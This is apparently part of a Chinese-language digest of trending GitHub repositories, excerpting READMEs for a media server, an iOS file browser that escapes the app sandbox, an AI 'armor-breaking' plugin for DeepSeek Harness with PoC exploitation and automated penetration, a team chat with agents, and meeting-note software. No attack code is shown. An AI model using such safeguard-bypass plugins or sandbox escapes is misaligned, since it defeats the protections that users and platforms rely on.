-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#9  HolyArrs/HolyArrs
-    ⭐ 865 stars  |  🍴 42 forks  |  💻 Go  |  📅 2026-11-09
-    🔗 https://github.com/HolyArrs/HolyArrs
-    📡 来源: 🚀 5天300+星
-    🏷️ docker, homelab, jellyfin, media-server, plex, self-hosted
-    📝 One self-hosted app for your shows, movies and music.
-
-    README 摘要:
-    English · 简体中文 · हिन्दी · Español · Français · العربية · Português · Русский · 日本語 · Deutsch · 한국어 · Italiano · Polski · Nederlands · Türkçe · Українська
-    
-      
-        
-        
-      
-    
-    &nbsp;&nbsp;
-    
-      
-      
-      
-      
-      
-      
-    
-    > [!NOTE]
-    > **HolyArrs 1.0.19: rTorrent and ruTorrent as a Downloader**, seedboxes too. Finished Usenet downloads now move into your Library instead of being copied. See what's new
-    >
-    > 
-    
-    > Every poster, trailer and score in your HolyArrs comes from a server I run and pay for myself, so it stays free for everyone. If HolyArrs made movie night a little better, a sponsor keeps the lights on for all of us 💛
-    >
-    > 
-    
-    > [!TIP]
-    > Be with us!
-    >
-    > | | |
-    > |:--|:--|
-    > |  | Get help fast and hang out on Discord |
-    > |  | Share ideas and vote on r/HolyArrs |
-    > |  | Sneak peeks on X |
-    > |  | More projects on GitHub |
-    
-    Six apps to watch a show. Now it's one.
-    
-    HolyArrs is one self-hosted app for your shows, movies and music.Browse like a streaming app, ask for what you want, and it handles the rest.
-    
-    About 15 MB to download · about 140 MB of RAM idle with 10,000 titles · amd64, arm64, armv7The six apps it replaces download 718.2 MB together.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#10  ⚠️风险  kolbicz/WQFiles
-    ⚠️ 命中风险词: exploit —— 默认归排除区，需人工确认
-    ⭐ 670 stars  |  🍴 54 forks  |  💻 Objective-C  |  📅 2026-11-09
-    🔗 https://github.com/kolbicz/WQFiles
-    📡 来源: 🚀 5天300+星
-    📝 File browser, app data manager and cache cleaner for iOS 27 (worse_query, no jailbreak)
-
-    README 摘要:
-    # Worse Query Files
-    
-    **WQ Files** is a file browser, app data manager and cache cleaner for iOS 26
-    and 27. "WQ" stands for worse_query, the sandbox technique it is built on. It
-    reaches other apps' and system containers with no jailbreak and no kernel
-    exploit. Tested on iOS 26.7.1, 27.0.1 and 27.2.
-    
-    **iOS 26 (26.0 to 26.7.2):** preliminary support since 0.7; tested on 26.7.1. worse_query reaches the app, extension, daemon and app group
-    containers there, but not System Data or the system groups, so WQ Files hides
-    those two and the Cache Cleaner has no crash-log section. A full inode scan
-    would take most of an hour on iOS 26, so App Data, Extension Data and App
-    Groups are listed from the LaunchServices database instead (found once and
-    remembered). Internal Daemons aren't in that database: the first scan for them
-    takes long, later ones only check new files. Apps, backups, restores, clearing
-    app data, the Cache Cleaner and the file browser work as on iOS 27. App icons
-    don't: iOS 26 hands WQ Files only placeholder icons and doesn't let it read
-    other apps' bundles, so apps show symbol tiles.
-    
-    WQ Files is available in English, German, Italian, Spanish, Korean, Arabic
-    and Simplified Chinese. It follows the device language; **Language** in WQ Files'
-    Settings picks another, used from the next start.
-    
-    ## What it opens
-    
-    - **App Data**: every app's data container (`Containers/Data/Application`),
-      shown with the app's name, bundle ID and icon instead of a UUID.
-    - **App Groups**: shared group containers.
-    - **Extension Data** and **Internal Daemons**.
-    - **App Bundles**: each installed app's bundle container
-      (`/var/containers/Bundle/Application`) with its `.app`, labeled with the
-      app's name; also from Apps: long-press an app → **Open App Bundle**. Shown
-      only where iOS lets WQ Files open these folders (the startup check tries;
-      iOS 26 and 27.0.1 don't).
-    - **System Data**: `/var/containers/Data/System` (listing only; its contents
-      are owned by root).
-    - **System Groups**: the parent cannot be listed on 27.0.1, so known container
-      names are tried one by one; tap **+** to try another name. Covers the
-      MobileGestalt cache and the configuration-profiles (Supervision) folder.
-    - **Go to Path** for any absolute path.
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#11  ⚠️风险  FJNB5/fujiang-pojia
-    ⚠️ 命中风险词: poc —— 默认归排除区，需人工确认
-    ⭐ 660 stars  |  🍴 325 forks  |  💻 JavaScript  |  📅 2026-11-09
-    🔗 https://github.com/FJNB5/fujiang-pojia
-    📡 来源: 🚀 5天300+星
-    🏷️ ai-agent, cve, deepseek, deepseek-harness, fujiang-pojia, knowledge-base, pojia, security-assessment, skills
-    📝 富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面
-
-    README 摘要:
-    **点击加入频道：https://t.me/DeepSeek22**
-    
-    欢迎加入频道，关注富江破甲。
-    
-    
-    
-    # 富江破甲（破甲）
-    
-    富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面
-    
-    本项目将 `@deepseek-ai/dsh-prompt-custom` 安装到 DeepSeek Harness 的配置目录。插件程序位于 `plugin/`，提示词配置单独保存在 `prompt-custom.json`。
-    
-    ## 下载与安装
-    
-    在仓库页面点击 **Code → Download ZIP**（代码 → 下载压缩包），解压后安装；也可以使用 Git 克隆本仓库。
-    
-    1. 先启动一次官方 DeepSeek Harness Desktop，完成 `desktop` 配置初始化。
-    2. 完全退出 Harness，包括右下角托盘图标中的“退出”。
-    3. 双击解压目录中的 **`点我执行脚本.cmd`**。
-    4. 安装完成后自行重新打开 Harness。
-    
-    如果检测到 Harness 仍在运行，安装器会提示退出并停止，本次不会修改文件。**安装器不会自动关闭或重启 Harness，也不支持 `-NoRestart` 参数。**
-    
-    ```powershell
-    # 完全退出 Harness 后执行安装
-    .\点我执行脚本.cmd
-    
-    # 仅查看安装计划，不修改文件
-    .\install.ps1 -DryRun
-    ```
-    
-    安装器默认使用 `desktop` 配置，会从运行路径、默认安装位置、注册表和开始菜单或桌面快捷方式查找 Desktop 自带的 DSH 命令行工具，再尝试系统 PATH，支持安装到 D、E 等其他盘符。双击安装脚本仍未找到时，可按提示粘贴实际安装文件夹或可执行文件路径。
-    
-    也可以手动指定安装目录；程序目录与 `.dsh` 数据目录是两个不同位置：
-    
-    ```powershell
-    # 指定程序安装目录，支持中文和空格
-    .\install.ps1 -DshCommand "D:\应用\DeepSeek Harness"
-    
-    # 仅当 .dsh 数据目录也移动过时，额外指定数据目录
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#12  agentes-chat/agentes-chat
-    ⭐ 608 stars  |  🍴 78 forks  |  💻 TypeScript  |  📅 2026-11-09
-    🔗 https://github.com/agentes-chat/agentes-chat
-    📡 来源: 🚀 5天300+星
-    🏷️ agentic-ai, ai-agents, browser-automation, chat, claude, claude-code, codex, collaboration, computer-use, docker-compose
-    📝 Open-source, self-hosted Slack alternative where your team and AI agents work together in channels and DMs. Agents run on Claude, ChatGPT/Codex, Gemini or Grok, with MCP tools, their own computer and browser, routines, memory and approvals. Web, desktop and phone apps. Docker Compose + Postgres. AGPL-3.0.
-
-    README 摘要:
-    agentes.chat
-    
-    The open-source, self-hosted Slack alternative where your team and AI agents work together.
-    
-      Website ·
-      Cloud ·
-      Self-hosting ·
-      Features ·
-      Discussions
-    
-      
-      
-      
-      
-    
-      
-    
-    Agents join your channels and DMs with a role, an owner and a budget, work where everyone can see,
-    and ask before anything sensitive. They think with Claude, ChatGPT and Codex, Gemini, Grok or any
-    OpenRouter model, use MCP tools, and get a computer and a browser of their own. Self-host it for
-    free with your own model keys, or use agentes.chat Cloud: both run this same codebase.
-    
-    ## Why agentes.chat
-    
-    - **One conversation for people and agents.** Agents are members of the workspace, not a sidebar
-      bot: they read the channel, answer when it's theirs to answer, and hand work back and forth.
-    - **Safe by default.** Merges, deploys and anything a connector marks sensitive wait for a person's
-      approval in the chat. Every model call is budgeted and recorded per agent.
-    - **Agents that actually do the work.** Their own computer, a real browser you can watch and take
-      over, Claude Code and Codex, routines on a schedule or an event, memory that learns.
-    - **Yours to run.** One command on a Linux server, Postgres as the only dependency, web, desktop and
-      phone apps that connect to your server.
-    
-    An open-source alternative to team chat with bolted-on AI bots, and to single-player agent apps such
-    as Grok Bot, ChatGPT dots, OpenBot.run and OpenMausBot (all of which it imports from).
-    
-    ## Quick start
-    
-    - **Cloud:** sign up at agentes.chat.
-    - **Your own server** (Linux):
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#13  FrigadeHQ/yogurt
-    ⭐ 579 stars  |  🍴 18 forks  |  💻 TypeScript  |  📅 2026-11-10
-    🔗 https://github.com/FrigadeHQ/yogurt
-    📡 来源: 🚀 5天300+星
-    🏷️ electron, linux, llama-cpp, local-ai, macos, mcp, meeting-notes, open-source, privacy, transcription
-    📝 Private AI meeting notes. Free and open source.
-
-    README 摘要:
-    Private AI meeting notes. Free and open source.
-    
-      Download for Mac · Windows · Linux
-    
-      
-    
-      Yogurt records your calls without adding a bot to the meeting.
-    
-      macOS 14.4+ (Apple Silicon) · Windows 10 2004+ (x64) · Ubuntu 22.04+ or similar (x64 AppImage) · 8 GB memory
-      yogurt.so · Help · Build and run locally · MIT license
-      Made by Frigade.
-    
-    ## What it does
-    
-    - **Live transcripts.** Yogurt records calls and turns speech into text as you talk.
-    - **Meeting summaries.** Yogurt writes up the conversation and any notes you add.
-    - **Private by default.** Your audio, transcripts and AI processing stay on your computer.
-    - **Free and open source.** You can use Yogurt without an account.
-    - **Who said what.** Yogurt names speakers from Zoom, Teams and Meet on Mac only.
-    - **Languages.** Multi-language mode transcribes 99 languages.
-    - **Recording reminders.** Yogurt offers to record when a supported call starts.
-    - **Answers with sources.** Yogurt answers questions across meetings and links to the source.
-    - **Folders and search.** You can find meetings by folder, title, notes or transcript.
-    - **Copy and export.** You can copy notes or transcripts, or save both as Markdown.
-    - **Local MCP server.** Your chosen assistant app can read your notes when you allow access.
-    - **Automatic stop.** Yogurt stops recording when the call ends.
-    
-    ## Watch the demo
-    
-    https://github.com/user-attachments/assets/da16b894-beb1-491a-89e1-fd10666dc9b8
-    
-    ## How it works
-    
-    1. **Record.** Start recording your microphone and call audio; you can add your own notes.
-    2. **Transcribe.** Yogurt uses whisper.cpp and, on supported Macs, Apple SpeechAnalyzer.
-    3. **Summarize and ask.** A local open-weight model runs through llama.cpp.
-    
-    Meeting data stays local; Yogurt goes online for model downloads and update checks.
-    
-    Where your meetings, recordings, settings and models are stored
